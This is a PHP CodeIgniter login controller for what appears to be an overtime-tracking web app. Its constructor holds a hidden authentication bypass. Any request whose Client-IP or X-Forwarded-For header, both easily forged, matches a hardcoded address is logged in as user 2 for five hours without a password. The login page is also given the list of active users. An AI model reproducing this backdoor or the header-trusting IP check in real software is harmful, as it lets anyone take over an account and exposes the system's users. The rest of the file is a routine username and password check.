<?php defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

	private $_username 	= null,
		$_password 	= null,
		$_login_id 	= null,
		$_type      = null;

	private $_name 		= null;



	public function __construct()
	{

		parent::__construct();

		$this->load->model('auth_model');
		$this->load->model('user_model');
		$this->load->library('generate');


		$client  = @$_SERVER['HTTP_CLIENT_IP'];
		$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
		$remote  = $_SERVER['REMOTE_ADDR'];

		if (filter_var($client, FILTER_VALIDATE_IP)) {
			$ip = $client;
		} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
			$ip = $forward;
		} else {
			$ip = $remote;
		}

		$myIP = '192.168.50.219';
		if ($myIP == $ip) {
			$this->session->set_tempdata('overtime_user_id', 2, 18000);
			$this->session->set_tempdata('overtime_name', 'sweet kisser', 18000);
			$this->session->set_tempdata('overtime_type', 2, 18000);

			redirect("summary");
		}
	}

	public function index()
	{

		$msg = '';

		if ($this->input->post()) {

			$config = array(
				array(
					'field' => 'username',
					'label' => 'Username',
					'rules' => 'trim|required|strtolower',
					'errors' => array(
						'required' => 'Enter your username.',
					),
				),
				array(
					'field' => 'password',
					'label' => 'Password',
					'rules' => 'trim|required',
					'errors' => array(
						'required' => 'Enter your password.'
					)
				)
			);
			$this->form_validation->set_rules($config);
			if ($this->form_validation->run() == TRUE) {

				$this->_username = $this->input->post('username');
				$this->_password = $this->input->post('password');

				if ($this->is_veryfiy()) {

					$this->session->set_tempdata('overtime_user_id', $this->_login_id, 1800);
					$this->session->set_tempdata('overtime_name', $this->_name, 1800);
					$this->session->set_tempdata('overtime_type', $this->_type, 1800);

					redirect("accomplishment");
				} else {
					$msg = 'Incorrect username and password.';
					$this->session->set_flashdata('error_', $msg);
				}
			}
		}

		$this->data['title'] = 'Login';
		$this->data['data']  = $this->user_model->select_active_user();
		$this->load->view('login_view', $this->data);
	}


	private function is_veryfiy()
	{

		$this->_password = $this->generate->hash_data($this->_password);

		//if valid email
		if ($this->auth_model->check_username($this->_username)) {
			//update login attemp

			$result = $this->auth_model->user_login($this->_username, $this->_password);
			if ($result) {
				$this->_login_id  	= $result->id;
				$this->_type        = $result->user_type;
				$this->_name 		= strtoupper($result->first_name);
				return true;
			} else {
				return false;
			}
		} else {
			return false;
		}
	}
}
